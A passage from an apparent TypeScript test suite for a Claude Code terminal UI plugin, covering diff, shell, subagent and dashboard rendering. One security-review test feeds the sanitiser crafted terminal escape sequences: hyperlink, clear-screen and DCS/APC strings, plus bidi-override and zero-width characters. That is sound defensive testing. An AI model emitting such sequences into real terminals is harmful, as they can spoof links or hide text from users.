  expect((await row.find({ type: 'Text', text: /src\/app\.py/ }))?.text).toBe('src/app.py') // relative to the project
  expect(await row.find({ type: 'Text', text: /\+2 −1/ })).toBeDefined()
  // T-0143: 'the git diffs with the green/red are weird in contrast': softer text colours
  expect((await row.find({ type: 'Text', text: /^old one$/ }))?.props.color).toBe(hex(C.del))
  expect((await row.find({ type: 'Text', text: /^new two$/ }))?.props.color).toBe(hex(C.add))
  expect(await row.find({ type: 'Text', text: /^ ?12 $/ })).toBeDefined() // 'new two' is line 12 of the new file
  expect(await row.find({ type: 'Text', text: /keep/ })).toBeUndefined() // unchanged context stays out
  expect(JSON.stringify(await row.drawn())).not.toContain('backgroundColor')
  // T-0179 steer: 'the command changes … I want in panels too'
  expect((await row.find({ type: 'Box', key: 'fm-edit' }))?.props.borderColor).toBe(hex(tint(C.edit)))
  await row.unmount()
  const many = await mount('e2', { ...base, output: patch(['-gone', ...Array.from({ length: 20 }, (_, i) => `+add ${i}`)]) })
  expect(await many.find({ type: 'Text', text: /… 13 more changed lines/ })).toBeDefined()
  await many.unmount()
  const made = await mount('e3', { ...base, tool: 'Write', input: { file_path: '/repo/new.md', content: 'a\nb\nc' },
    output: { type: 'create', filePath: '/repo/new.md', content: 'a\nb\nc', structuredPatch: [], originalFile: null } })
  expect(await made.find({ type: 'Text', text: /Wrote/ })).toBeDefined()
  expect(await made.find({ type: 'Text', text: /\+3/ })).toBeDefined()
  expect(await made.find({ type: 'Text', text: /^b$/ })).toBeDefined()
  await made.unmount()
  const failed = await mount('e4', { ...base, isErrored: true, output: 'String to replace not found in file.' })
  expect(await failed.find({ type: 'Text', text: /Edited/ })).toBeUndefined() // the engine's row shows the error
  await failed.unmount()
  // the engine's own result block under the row ('⎿ Added 2 lines' and the whole hunk again) is blanked: one diff, not two
  const result = (id: string, props: object) =>
    $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolResult', requestId: id, props: { tool_use_id: id, ...props } })
  const shown = await result('r1', { tool: 'Edit', isErrored: false, output: patch(['-old one', '+new one']) })
  expect(await shown.find({ type: 'Box', key: 'fm-edit-shown' })).toBeDefined()
  await shown.unmount()
  const error = await result('r2', { tool: 'Edit', isErrored: true, output: 'String to replace not found in file.' })
  expect(await error.find({ type: 'Box', key: 'fm-edit-shown' })).toBeUndefined()
  await error.unmount()
})

test('kit: an edit\'s changed lines, numbered per file, with tabs, control and bidi characters cleaned', () => {
  const got = changedLines([
    { oldStart: 3, newStart: 3, lines: [' a', '-\tb\u001b[31m', '+c\u202eevil', '\\ No newline at end of file'] },
    { oldStart: 40, newStart: 41, lines: ['+d'] },
  ])
  expect(got).toEqual([
    { n: 4, sign: '-', text: '  b' },
    { n: 4, sign: '+', text: 'cevil' },
    { n: 41, sign: '+', text: 'd' },
  ])
})

test('kit: drawn text loses every escape sequence, control and bidi character; a carriage return keeps what a terminal shows', () => {
  // T-0144 (security review): only CSI colour codes were stripped from shell output
  const evil = 'a\u001b]8;;http://x\u0007link\u001b]8;;\u0007b\u001b[2J\u001bPq\u001b\\c\u202ed\te'
  expect(clean(evil)).toBe('alinkbcd  e') // the DCS string (ESC P … ESC \\) goes whole, not just its introducer
  // review: 8-bit CSI/OSC, string forms (DCS, APC, PM, SOS), charset switches, zero-width and direction marks
  expect(clean('\u009d0;title\u0007x\u009b31my\u001b_apc\u001b\\z\u001b(Bw‏​v؜u')).toBe('xyzwvu')
  const out = outputSummary(`10%\r50%\r100% done\n${evil}`, '')
  expect(out.lines.map(l => l.text)).toEqual(['100% done', 'alinkbcd  e'])
  expect(lastLine({ stdout: `ok \u001b]0;title\u0007T-0001 done` })).toBe('ok T-0001 done')
})

test('a reloaded mod resumes the drive its turn end was for, once, and only in its own session', async ($, on) => {
  // T-0145: Claude Code hot-reloads the mod only when a turn really ends; the drive ended one so the change shows
  const RESUME: FmView = { ...CALM, resume_after_reload: { session: 'sess-1', at: '2026-10-03T06:30:00Z', task: 'T-0007' } }
  const { submitted, toasted } = world(on, [RESUME])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  expect(submitted).toEqual(['Continue the Foreman drive: the Foreman UI reloaded (T-0007)'])
  expect(toasted.join('\n')).toContain('Foreman UI reloaded · the drive continues') // seen, not just done
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true }) // a later reload, same record
  expect(submitted.length).toBe(1)
})

test('the resume prompt the mod submits draws as one quiet Foreman line', async ($, on) => {
  // T-0143 live: the engine drew it as a four-line grey block with its own explanation
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'UserMessage',
    props: { text: 'Continue the Foreman drive: the Foreman UI reloaded (T-0143)', origin: { kind: 'plugin', name: 'foreman-ui' },
      isExpanded: false } })
  expect(await row.find({ type: 'Box', key: 'fm-resumed' })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /UI reloaded/ })).toBeDefined()
  await row.unmount()
})

test('a subagent call is a Foreman row: type, task, tools, time, tokens, its report\'s first line; a background one says so', async ($, on) => {
  // T-0148: the engine drew the agent's name on a highlighted block and 'Backgrounded agent (↓ to manage …)'
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const input = { subagent_type: 'foreman:fm-reviewer', description: 'Review T-0144 guard fix', prompt: 'x' }
  const done = { status: 'completed', agentId: 'a1', agentType: 'foreman:fm-reviewer', prompt: 'x', usage: {},
    content: [{ type: 'text', text: '**Verdict:** changes needed.\nmore' }], totalToolUseCount: 7, totalDurationMs: 80000, totalTokens: 32400 }
  const mount = (component: 'ToolUse' | 'ToolResult', id: string, props: object) =>
    $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component, requestId: id, props: { tool_use_id: id, tool: 'Agent', ...props } })
  const row = await mount('ToolUse', 'g1', { input, isRunning: false, isErrored: false, isInterrupted: false, output: done })
  expect(await row.find({ type: 'Text', text: /fm-reviewer/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /Review T-0144 guard fix/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /7 tools · 1m 20s · 32k tokens/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /Verdict: changes needed\./ })).toBeDefined() // markdown stars dropped
  expect(JSON.stringify(await row.drawn())).not.toContain('backgroundColor')
  await row.unmount()
  const res = await mount('ToolResult', 'g1', { isErrored: false, output: done })
  expect(await res.find({ type: 'Box', key: 'fm-agent-result' })).toBeDefined()
  await res.unmount()
  const bg = await mount('ToolUse', 'g2', { input: { ...input, run_in_background: true }, isRunning: false, isErrored: false,
    isInterrupted: false, output: { status: 'async_launched', agentId: 'a2', description: 'First pass', prompt: 'x', outputFile: '/tmp/o' } })
  expect(await bg.find({ type: 'Text', text: /in the background/ })).toBeDefined()
  await bg.unmount()
})

test('the resume prompt is one quiet line even when its origin isn\'t marked as the plugin\'s', async ($, on) => {
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const text = 'The foreman-ui plugin sent a message:\nContinue the Foreman drive: the Foreman UI reloaded (T-0143)\n\nThis is how Claude Code surfaces a prompt a plugin submits between turns.'
  const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'UserMessage',
    props: { text, origin: { kind: 'unclassified' }, isExpanded: false } })
  expect(await row.find({ type: 'Box', key: 'fm-resumed' })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /UI reloaded \(T-0143\)/ })).toBeDefined()
  await row.unmount()
})

test('another session\'s resume record starts nothing here', async ($, on) => {
  const OTHER: FmView = { ...CALM, resume_after_reload: { session: 'sess-9', at: '2026-10-03T06:30:00Z', task: 'T-0007' } }
  const { submitted } = world(on, [OTHER])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  expect(submitted).toEqual([])
})

test('with the pane open the band stops repeating it; trust is a word beside the mode', async ($, on) => {
  // T-0146: 'there's duplicated things, in the dashboard'
  const trusted: FmView = { ...CALM, mode: { ...CALM.mode!, trust: true } }
  const { panes } = world(on, [trusted])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  let ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /^trust on$/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /Claude may edit the guard/ })).toBeUndefined() // no warning row
  expect(await ui.find({ type: 'Text', text: /queued/ })).toBeDefined() // closed pane: the band carries the day
  await ui.unmount()
  panes.shown = true
  ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /queued/ })).toBeUndefined()
  expect(await ui.find({ type: 'Text', text: /^→ / })).toBeUndefined()
  expect(await ui.find({ type: 'Button', text: 'dashboard' })).toBeUndefined()
  // T-0181: 'the dashboard is duplicated at the bottom of the chat even though there's a pannel on the top right'
  expect(await ui.find({ key: 'fm-band' })).toBeUndefined() // nothing the open dashboard doesn't show
  await ui.unmount()
})

test('with the pane open it is the one panel: no band, the attention row has what needs the person (T-0989)', async ($, on) => {
  const { panes } = world(on, [VIEW]) // a plan waits for a yes
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  panes.shown = true
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ key: 'fm-band' })).toBeUndefined()
  expect(await ui.find({ text: 'engine' })).toBeDefined()
  await ui.unmount()
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /T-0009 plan awaits your yes/ })).toBeDefined()
  await pane.unmount()
})

test('the pane: nothing stale, nothing cut without saying so, controls that read as actions', async ($, on) => {
  // T-0146: 'some stuff looks weird, not everything is shown, again, be self aware'
  const many = Array.from({ length: 9 }, (_, i) => ({ id: `T-01${10 + i}`, type: 'FEATURE', tier: 'M', title: `idea ${i}`, status: 'captured', waits: null }))
  const v: FmView = { ...CALM, inbox: many, inbox_total: 17, mode: { ...CALM.mode!, autonomy: 'full', drive: true }, typical: { 'CLEAN/S': 8 },
    brainstorm: { name: 'brainstorm-20261002-215842', running: false, answers: 4, count: 152, ideas: ['Cache gate results'], age_h: 9 } }
  world(on, [v])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Read', file_path: '/repo/a.py', agentId: 'ag1' } as never)
  await $.turn.complete({ answer: '', durationMs: 900, isAborted: false, turnId: 't9', reason: 'answer', agentId: 'ag1' })
  for (const p of ['/repo/src/a.py', '/tmp/scratch/x.py'])
    await $.tool.call({ tool: 'Edit', file_path: p, old_string: 'a', new_string: 'b', replace_all: false } as never)
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /Reading/ })).toBeUndefined() // a finished agent's last action is stale
  expect(await pane.find({ type: 'Text', text: /Cache gate results/ })).toBeUndefined() // a finished brainstorm stays in fm
  expect(await pane.find({ type: 'Text', text: /map the parser/ })).toBeUndefined() // a finished subagent leaves the agent lane
  expect(await pane.find({ type: 'Text', text: /… \d+ more/ })).toBeDefined() // 17 in the inbox: what doesn't fit is counted
  expect(await pane.find({ type: 'Button', text: 'turn drive off' })).toBeDefined()
  expect(await pane.find({ type: 'Button', text: 'switch to standard' })).toBeDefined()
  expect(await pane.find({ type: 'Button', text: 'mute' })).toBeDefined()
  await pane.unmount()
  const roomy = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...tall(120) })
  expect(await roomy.find({ type: 'Text', text: /… 8 more in the inbox/ })).toBeDefined() // 17, 9 listed
  await roomy.unmount()
})

test('a grounded brainstorm is one line, however recent', async ($, on) => {
  // T-0196: a brainstorm 40 minutes old listed ideas already built or dropped, as if they were open
  world(on, [{ ...CALM, brainstorm: { name: 'brainstorm-20261003-140947', running: false, answers: 6, count: 121,
    ideas: ['Replay the guard'], age_h: 0.7, grounded: true } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /Replay the guard/ })).toBeUndefined()
  expect(await pane.find({ type: 'Text', text: /121 ideas/ })).toBeUndefined() // T-1002: only a running one shows
  await pane.unmount()
})

test('a long task title gives way before the task id: the id never wraps', async ($, on) => {
  // T-0141: seen live, 'T-014' on one row and '1' on the next when the title filled the band
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  const id = await ui.find({ type: 'Box', key: 'fm-band-id' })
  expect(id?.props.flexShrink).toBe(0)
  expect(id?.text).toMatch(/T-0007/)
  await ui.unmount()
})

test('a shell row with a description reads like the running row: the description as its title, the command under it', async ($, on) => {
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const cmd = "python3 - <<'EOF'\nprint(1)\nprint(2)\nprint(3)\nEOF"
  const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'd1',
    props: { tool_use_id: 'd1', tool: 'Bash', input: { command: cmd, description: 'Print three numbers' }, isRunning: false,
      isErrored: false, isInterrupted: false, output: { stdout: '1\n2\n3', stderr: '', interrupted: false } } })
  expect(await row.find({ type: 'Text', text: 'Print three numbers' })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /^python3 - <<'EOF'$/ })).toBeDefined() // the command, whole up to 3 lines
  expect(await row.find({ type: 'Text', text: /… 2 more command lines/ })).toBeDefined()
  await row.unmount()
})

test('under a shell row the engine\'s result block is replaced; file changes, a commit and a timeout are Foreman lines', async ($, on) => {
  // T-0143 audit: the output drew twice (our │ lines, then the engine's ⎿ block), with a full-context diff and '(timeout 10m)'
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const output = { stdout: 'done', stderr: '', interrupted: false, timedOutAfterMs: 120000,
    gitOperation: { commit: { sha: 'abc1234def', kind: 'committed', branch: 'main' } },
    bashEditDiff: { hunks: [{ path: 'src/app.py', hunks: [{ oldStart: 3, oldLines: 1, newStart: 3, newLines: 1, lines: ['-a = 1', '+a = 2'] }] }],
      skippedLarge: ['big.bin'], restricted: [] } }
  const result = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolResult', requestId: 'g1',
    props: { tool_use_id: 'g1', tool: 'Bash', isErrored: false, output } })
  expect(await result.find({ type: 'Box', key: 'fm-shell-result' })).toBeDefined()
  expect(await result.find({ type: 'Text', text: 'engine' })).toBeUndefined()
  await result.unmount()
  const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'g1',
    props: { tool_use_id: 'g1', tool: 'Bash', input: { command: 'sed -i s/1/2/ src/app.py && git commit -qam x' },
      isRunning: false, isErrored: false, isInterrupted: false, output } })
  expect(await row.find({ type: 'Text', text: /src\/app\.py/ })).toBeDefined()
  expect((await row.find({ type: 'Text', text: /^a = 2$/ }))?.props.color).toBe(hex(C.add))
  expect(await row.find({ type: 'Text', text: /1 more file changed/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /committed abc1234 on main/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /timed out after 2m/ })).toBeDefined()
  await row.unmount()
})

test('a reply opens with a Foreman mark; Foreman report lines are coloured; the rest stays markdown', async ($, on) => {
  // T-0143: 'just your normal text output looks weird with everything else'
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const text = 'Fixed the loop.\n\nChanged: `src/a.py` — the guard\n✓ pytest → 3 pass\n✗ lint → 2 errors\n⚑ Captured T-0009 — dark mode\nNext: the docs'
  const msg = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'AssistantMessage',
    props: { text, isFirstOfReply: true } })
  expect(await msg.find({ type: 'Box', key: 'fm-reply-mark' })).toBeDefined()
  expect((await msg.find({ type: 'Markdown' }))?.text).toBe('Fixed the loop.')
  expect((await msg.find({ type: 'Text', text: /^src\/a\.py$/ }))?.props.color).toBe(hex(C.accent))
  expect((await msg.find({ type: 'Text', text: /^✓$/ }))?.props.color).toBe(hex(C.ok))
  expect((await msg.find({ type: 'Text', text: /^✗$/ }))?.props.color).toBe(hex(C.err))
  expect(await msg.find({ type: 'Text', text: 'T-0009' })).toBeDefined()
  expect(await msg.find({ type: 'Text', text: /the docs/ })).toBeDefined()
  expect(await msg.find({ type: 'Box', key: 'gap-1' })).toBeDefined() // the blank line before 'Changed:' stays (live)
  // T-0179: each message is a panel ('can we have each message … look like a panel'); the closing report is accented
  const panel = await msg.find({ type: 'Box', key: 'fm-reply' })
  expect(panel?.props.borderStyle).toBe('round')
  expect(panel?.props.borderColor).toBe(hex(C.accent))
  await msg.unmount()
  const more = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'AssistantMessage',
    props: { text: 'a second block', isFirstOfReply: false } })
  expect(await more.find({ type: 'Box', key: 'fm-reply-mark' })).toBeUndefined()
  const plain = await more.find({ type: 'Box', key: 'fm-reply' })
  expect(plain?.props.borderStyle).toBe('round') // every block is one, in a quiet grey
  expect(plain?.props.borderColor).toBe(hex(C.dim))
  await more.unmount()
  // T-0182 live: the newest reply kept a frozen spinner frame ('· ok') once its turn ended; it settles on ●
  await $.turn.start({ text: 'go', turnId: 'tz' })
  const newest = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'AssistantMessage',
    props: { text: 'ok', isFirstOfReply: true } })
  await $.turn.complete({ answer: '', durationMs: 900, isAborted: false, turnId: 'tz', reason: 'answer' })
  expect(await newest.find({ type: 'Text', text: '● ' })).toBeDefined()
  await newest.unmount()
  const long = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'AssistantMessage',
    props: { text: 'x'.repeat(12000), isFirstOfReply: true } })
  expect(await long.find({ type: 'Text', text: 'engine' })).toBeDefined() // too long for a Markdown element: the engine's
  await long.unmount()
})

test('a long shell command wraps under itself, not under the status mark', async ($, on) => {
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'w1',
    props: { tool_use_id: 'w1', tool: 'Bash', input: { command: 'grep -rn pattern src | head -40' }, isRunning: false,
      isErrored: false, isInterrupted: false, output: { stdout: 'src/a.py:1: x', stderr: '', interrupted: false } } })
  expect((await row.find({ type: 'Box', key: 'fm-shell-head' }))?.props.flexDirection).toBe('row')
  expect(await row.find({ type: 'Text', text: /^grep -rn pattern src \| head -40/ })).toBeDefined() // its own column
  expect((await row.find({ type: 'Box', key: 'fm-shell' }))?.props.borderColor).toBe(hex(tint(C.accent2))) // T-0179
  expect((await row.find({ type: 'Box', key: 'fm-shell' }))?.props.width).toBe('100%') // live: a short one hugged its text
  await row.unmount()
})

test('a folded group with a shell command unfolds, so the command gets its own row; reads stay folded', async ($, on) => {
  on('ui.render', { component: 'ToolGroup' }, async ($, e) => {
    const { Text } = $.ui.resolve(e)
    return <Text>{`group expanded=${e.props.isExpanded}`}</Text>
  })
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const call = (tool: string, input: object) => ({ tool, input, isRunning: true, isErrored: false, isInterrupted: false })
  const withShell = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolGroup',
    props: { calls: [call('Read', { file_path: 'a' }), call('Bash', { command: 'ls' })], isActive: true, isExpanded: false } })
  expect(await withShell.find({ type: 'Text', text: 'group expanded=true' })).toBeDefined()
  await withShell.unmount()
  const reads = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolGroup',
    props: { calls: [call('Read', { file_path: 'a' }), call('Grep', { pattern: 'x' })], isActive: true, isExpanded: false } })
  expect(await reads.find({ type: 'Text', text: 'group expanded=false' })).toBeDefined()
  await reads.unmount()
})

test('the pane shows a brainstorm while it runs, with its newest idea', async ($, on) => {
  // T-0124: 'I want to be able to see brainstorm ideas'
  const running = { name: 'brainstorm-20261003', running: true, answers: 3, expected: 12, count: 41, ideas: ['Faster gates', 'A mascot'] }
  world(on, [{ ...CALM, brainstorm: running }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: 'ideas: A mascot' })).toBeDefined() // at the end of the agent lane
  expect(await pane.find({ type: 'Text', text: '3/12' })).toBeDefined()
  await pane.unmount()
  // and in the chat: the running fm ideas call carries the same progress under its row
  const props = { tool_use_id: 'i1', tool: 'Bash', input: { command: 'fm ideas --pack p.md --rounds 2' }, isRunning: true,
    isErrored: false, isInterrupted: false }
  const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'i1', props })
  expect(await row.find({ type: 'Text', text: /✦ 3\/12 answers · 41 ideas so far · A mascot/ })).toBeDefined()
  await row.unmount()
})

test('the pane reads top-down: head with the attention row, task, Activity, Up next, History, Today, controls (T-0909, T-0989, T-1002)', async ($, on) => {
  world(on, [{
    ...VIEW,
    approvals: [{ task: 'T-0007', allow: ['core'], why: 'edit the guard' }],
    typical: { 'FIX/M': 20 },
    active: { ...VIEW.active!, on_task_s: 1800 },
    done_days: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 2, 3],
    today_done: 3,
  }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  const drawn = JSON.stringify(await ui.drawn())
  const at = (key: string) => drawn.indexOf(`"${key}"`)
  const order = ['fm-pane-head', 'fm-pane-attention', 'task', 'activity', 'queue', 'history', 'today', 'fm-pane-controls']
  expect(order.map(at).every(i => i >= 0)).toBe(true)
  expect([...order.map(at)].sort((x, y) => x - y)).toEqual(order.map(at))
  let rows = 4 + (await ui.find({ key: 'task' }))?.props.height as number // head 3 (attention its third row), controls
  for (const key of ['head', 'controls']) if (await ui.find({ key: `gap-${key}` })) rows += 1
  for (const key of ['activity', 'queue', 'sessions', 'history', 'today']) {
    const h = (await ui.find({ key: `${key}-body` }))?.props.height as number | undefined
    if (h) rows += h + 1 + ((await ui.find({ key: `gap-${key}` })) ? 1 : 0) // its rows, its titled divider, the gap above
  }
  expect(rows).toBe(60) // T-1000, T-1002: the whole dock, no more, no less, dividers and spacing included
  const rasters = (await ui.findAll({ type: 'Raster' })).map(r => r.key)
  expect(rasters).toEqual(expect.arrayContaining(['stage-rail', 'done-days', 'fm-tank-cells', 'lane-r-run', 'lane-r-web']))
  expect(await ui.find({ type: 'Text', text: /⚠ needs you: T-0007 core — edit the guard/ })).toBeDefined() // above the plan
  expect(await ui.find({ type: 'Text', text: /30m 00s of ~20m/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /3 today/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /↳ pytest -q|left before done/ })).toBeUndefined() // T-1002: fewer words
  expect(await ui.find({ key: 'more-fleet-0' })).toBeUndefined() // one session alone is this one
  await ui.unmount()
  const short = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...tall(32) }) // about a 40-row terminal's dock
  expect((await short.findAll({ type: 'Raster' })).some(r => r.key === 'done-days')).toBe(true) // the charts, not '… 2 more'
  await short.unmount()
})

test('a running call shows at the end of its lane; the lanes chart the session tool calls and never move (T-0909, T-1002)', async ($, on) => {
  const { answer, clock } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Read', file_path: '/repo/src/a.py' })
  await $.tool.call({ tool: 'Edit', file_path: '/repo/src/a.py', old_string: 'a', new_string: 'b', replace_all: false })
  answer.hold = 1000
  void $.tool.call({ tool: 'Bash', command: 'make test', description: 'run the tests' })
  await clock.advance(100)
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  const before = (await ui.find({ key: 'activity-body' }))?.props.height
  expect(await ui.find({ type: 'Text', text: /1 running/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: 'run the tests' })).toBeDefined()
  const rasters = (await ui.findAll({ type: 'Raster' })).map(r => r.key)
  expect(rasters).toEqual(expect.arrayContaining(['lane-r-run', 'lane-r-read', 'lane-r-edit', 'stage-rail']))
  await clock.advance(1000)
  await ui.unmount()
  const after = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await after.find({ type: 'Text', text: /3 calls, last 1m ago/ })).toBeDefined()
  expect(await after.find({ type: 'Text', text: 'run the tests' })).toBeDefined() // now the lane's last call, quiet
  expect(await after.find({ type: 'Text', text: /running/ })).toBeUndefined() // it finished
  expect((await after.find({ key: 'activity-body' }))?.props.height).toBe(before) // nothing moved
  await after.unmount()
})

test('a quiet project: nothing active, the news under the gauges, an empty queue with the capture box (T-0909)', async ($, on) => {
  world(on, [{ ...VIEW, active: null, queue: [], inbox: [], inbox_total: 0 }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ type: 'Text', text: /0 queued$/ })).toBeDefined()
  expect(await ui.find({ key: 'capture' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /Nothing active/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: 'T-0011 captured' })).toBeDefined() // in History
  await ui.unmount()
})

test('History lists the newest first, one short line each, as many as fit (T-1002)', async ($, on) => {
  const recent = Array.from({ length: 24 }, (_, i) => `  10:${String(i).padStart(2, '0')}  ✓ T-0007 step ${i + 1}: pytest -q → exit 0 · 3 passed`)
  world(on, [{ ...CALM, recent }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  const rows = (await ui.find({ key: 'history-body' }))?.props.height as number
  expect(rows).toBeGreaterThan(2)
  for (let i = 0; i < rows; i++) expect(await ui.find({ type: 'Text', text: `T-0007 step ${24 - i} passed` })).toBeDefined() // newest first, none squeezed out
  expect(await ui.find({ type: 'Text', text: `T-0007 step ${24 - rows} passed` })).toBeUndefined()
  expect(await ui.find({ type: 'Text', text: /pytest -q/ })).toBeUndefined() // the command stays in the ledger
  await ui.unmount()
})

test('a step that just got done glows, then settles (T-0909)', async ($, on) => {
  const doneTwo = { ...VIEW, active: { ...VIEW.active!, steps: VIEW.active!.steps.map(s => ({ ...s, done: true, current: false })) } }
  const { clock } = world(on, [VIEW, doneTwo])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect((await ui.find({ type: 'Text', text: /2  raise the timeout/ }))?.props.backgroundColor).toBeUndefined()
  await ui.press({ key: 'refresh' }) // the next snapshot: step 2 is done now
  expect((await ui.find({ type: 'Text', text: /2  raise the timeout/ }))?.props.backgroundColor).toBeDefined()
  await ui.unmount()
  await clock.advance(3000)
  const later = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect((await later.find({ type: 'Text', text: /2  raise the timeout/ }))?.props.backgroundColor).toBeUndefined()
  await later.unmount()
})

test('while work runs the rail moves between redraws (30 fps blit), and settles when it ends (T-0909)', async ($, on) => {
  const { answer, clock, blits } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  answer.hold = 2000
  void $.tool.call({ tool: 'Bash', command: 'make build', description: 'build' })
  await clock.advance(50)
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  const cells = async () => ((await ui.findAll({ type: 'Raster' })).find(r => r.key === 'stage-rail')?.props as { cells?: string } | undefined)?.cells
  const seen = new Set<string | undefined>()
  for (let i = 0; i < 8; i++) {
    seen.add(await cells())
    await clock.advance(40)
  }
  expect(seen.size).toBeGreaterThan(1) // the comet moved
  expect(blits.filter(k => k === 'stage-rail').length).toBeGreaterThan(5) // and between redraws: the 30 fps blit
  await clock.advance(3000) // the call ended: nothing live
  const a = await cells()
  await clock.advance(400)
  expect(await cells()).toBe(a)
  await ui.unmount()
})

test('a question waiting on you shows as waiting, not as running work, and is not charted (T-0909)', async ($, on) => {
  const { answer, clock } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  answer.hold = 5000
  void $.tool.call({ tool: 'AskUserQuestion', questions: [] })
  await clock.advance(100)
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ type: 'Text', text: /⚠ waiting for your answer/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /running/ })).toBeUndefined()
  expect(await ui.find({ type: 'Text', text: /calls, last/ })).toBeUndefined() // not charted
  await clock.advance(5000)
  await ui.unmount()
})

test('off the terminal each lane is a labelled sparkline and the rail its text twin (T-0909)', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Bash', command: 'ls', description: 'list' })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'desktop', ...PANE })
  expect(await ui.find({ key: 'lane-run' })).toBeDefined()
